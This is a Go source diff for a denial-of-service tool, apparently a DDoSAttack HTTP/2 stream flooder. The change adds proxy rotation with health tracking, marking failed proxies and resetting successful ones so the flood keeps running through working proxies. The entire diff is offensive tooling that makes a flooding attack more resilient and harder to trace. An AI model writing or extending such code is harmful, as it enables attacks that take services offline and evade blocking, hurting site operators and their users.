@@ -32,10 +32,10 @@ func (d *DDoSAttack) startHTTP2StreamFloodWorkers(numWorkers int) {
 		return
 	}
 
-	// Configure proxy if enabled
-	if d.config.UseProxy && len(d.config.ProxyList) > 0 && !d.config.RotateProxy {
+	// Configure proxy if enabled (single proxy mode)
+	if d.config.UseProxy && !d.config.RotateProxy && len(d.proxies) > 0 {
 		// Use first proxy for all requests
-		if parsedURL, err := url.Parse(d.config.ProxyList[0]); err == nil {
+		if parsedURL, err := url.Parse(d.proxies[0]); err == nil {
 			transport.Proxy = http.ProxyURL(parsedURL)
 		}
 	}
@@ -80,11 +80,28 @@ func (d *DDoSAttack) sendHTTP2StreamRequest(client *http.Client, targetURL strin
 
 	// Create a new client for proxy rotation if needed
 	actualClient := client
-	if d.config.UseProxy && d.config.RotateProxy && len(d.config.ProxyList) > 0 {
-		// Create a new transport with rotated proxy
-		idx := atomic.AddInt64(&d.proxyIndex, 1) - 1
-		proxyURL := d.config.ProxyList[int(idx)%len(d.config.ProxyList)]
+	var usedProxy string
+
+	if d.config.UseProxy && d.config.RotateProxy {
+		// Create a new transport with rotated healthy proxy
+		if proxyURL, ok := d.getNextProxy(); ok {
+			if parsedURL, err := url.Parse(proxyURL); err == nil {
+				usedProxy = proxyURL
+				transport, err := d.createHTTP2Transport()
+				if err == nil {
+					transport.Proxy = http.ProxyURL(parsedURL)
+					actualClient = &http.Client{
+						Transport: transport,
+						Timeout:   d.config.Timeout,
+					}
+				}
+			}
+		}
+	} else if d.config.UseProxy && !d.config.RotateProxy && len(d.proxies) > 0 {
+		// Single-proxy mode: track which proxy is used for health reporting
+		proxyURL := d.proxies[0]
 		if parsedURL, err := url.Parse(proxyURL); err == nil {
+			usedProxy = proxyURL
 			transport, err := d.createHTTP2Transport()
 			if err == nil {
 				transport.Proxy = http.ProxyURL(parsedURL)
@@ -121,6 +138,10 @@ func (d *DDoSAttack) sendHTTP2StreamRequest(client *http.Client, targetURL strin
 	resp, err := actualClient.Do(req)
 	if err != nil {
 		atomic.AddInt64(&d.requestsFailed, 1)
+		// Track proxy failures for health monitoring
+		if usedProxy != "" {
+			d.markProxyFailure(usedProxy)
+		}
 		return
 	}
 	defer resp.Body.Close()
@@ -132,4 +153,9 @@ func (d *DDoSAttack) sendHTTP2StreamRequest(client *http.Client, targetURL strin
 	responseTime := time.Since(startTime)
 	atomic.AddInt64(&d.totalResponseTime, int64(responseTime))
 	atomic.AddInt64(&d.requestsSuccess, 1)
+
+	// Successful request through a proxy resets its failure counter
+	if usedProxy != "" {
+		d.markProxySuccess(usedProxy)
+	}
 }
